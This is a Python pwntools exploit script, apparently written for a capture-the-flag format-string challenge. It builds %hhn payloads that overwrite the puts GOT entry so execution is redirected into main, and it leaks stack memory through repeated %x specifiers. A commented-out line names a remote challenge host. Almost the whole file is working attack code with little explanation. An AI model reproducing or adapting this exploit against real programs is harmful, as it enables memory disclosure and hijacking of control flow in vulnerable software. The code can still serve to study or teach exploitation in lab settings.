#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

# count = 0
# conn = remote("4.31.182.242", 9002) 
conn = process('./format_string')

welcome = conn.recvuntil('>')
welcome += conn.recvuntil('>')
welcome += conn.recvuntil('>')
print welcome,

current_val = 0

def set_cur_val(a):
	global current_val
	gets_to_zero = 256 - current_val # add this to get to 0x00
	gets_to_destination = gets_to_zero + a # add this to get to where you want to be
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256
	current_val = a
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%5$0" + str(inc) + "c" 

def payload_write_data_to_addr(data, addr):
	global current_val

	# 0xaabbccdd -> aabbccdd
	hexStr = hex(data)[2:][::-1] # little endian

	# aabbccdd -> [aa, bb, cc, dd]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	bytes = [int(x,16) for x in byteList]


	payload = "A" 

	for a in range(len(bytes)):
		payload += p32(addr + a)

	# this is the offset of the first address in our string
	offset = 7 
	current_val = len(payload)

	# current_val is the current number of bytes writen

	# we have our 4 addresses to each byte of the eip
	# write to one of those current_val
	write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

	for pos, byte in enumerate(bytes):
		payload += set_cur_val(byte) + write_to_byte(pos)

	return payload

def leak_10(start):
	payload = ""
	for x in range(start, start + 100):
		payload += "%" + str(x) + "$x|"
	send(conn, "AA" + payload + "BB")
	conn.recvuntil('AA'),
	memoryString = conn.recvuntil('BB')[:-2] # 78243533|3633257c|257c7824| .. |:E
	conn.recv(),
	# print  payload
	print memoryString
	return memoryString.split('|')

def stitch(steps, shift=0):
	jump = 9+2 # how much over lap do we want 5=5 1=9 10=0
	memory = leak_10(1 + shift)
	for x in range(1 + shift, steps + shift):
		leak = leak_10(x*jump)
		index = x*(jump-1) - 1 # %1$x gives you the 0th thing in our array
		i = 0
		for b in range(index, index + 100):
			# this is the thing that we leak
			newData = leak[i]
			# if it's some of the overlap
			if b < len(memory):
				# grab the old data
				oldData = memory[index]
				# find the parts that are different
				for pos, char in enumerate(newData):
					if pos < len(oldData) and oldData[pos] != char:
						# mark these with an '_'
						listData = [c for c in newData]
						listData[pos] = '_'
						
						newData = ''.join(listData)
				# update memory
				memory[index] = newData
			else:
				# otherwise it's new so just append it
				memory.append(newData)

			i += 1
			index += 1
	return memory


puts = 0x08049aec
main_start = 0x0804851f
jump_start = 0x08048535
after_puts = 0x08048592
main_end = 0x08048592

# Set puts to be the the main function


payload = payload_write_data_to_addr(jump_start, puts)
send(conn, payload)
print conn.recv(),


send(conn, "payload 1 %x")
print conn.recv(),

send(conn, "payload 2 %x")
print conn.recv()


# print stitch(100)

# leaks = []
# for addr in dump:
# 	addr = addr.replace('_', '0')
# 	if len(addr) == 8 and addr[:2] == 'ff':
# 		leaks.append(int(addr,16))
# leaks = list(set(leaks))
# leaks.sort()
# # leaks = [hex(leak) for leak in leaks]
# print leaks
# for x in range(leaks[0], leaks[0] - 10, -1):
# 	payload = payload_write_data_to_addr(0xaaaaaaaa, x)
# 	send(conn, payload)


# print stitch(100)

print leak_10(0)
# leak_10(20)
# leak_10(20)
# conn.interactive()


# print conn.recv()


# send(conn, payload)
# print conn.recv()

send(conn, "Goodbye :)")
print conn.recv()
# set puts to be the return spot in the main function
payload = payload_write_data_to_addr(main_end, puts)
send(conn, payload)
print conn.recv()

conn.close()



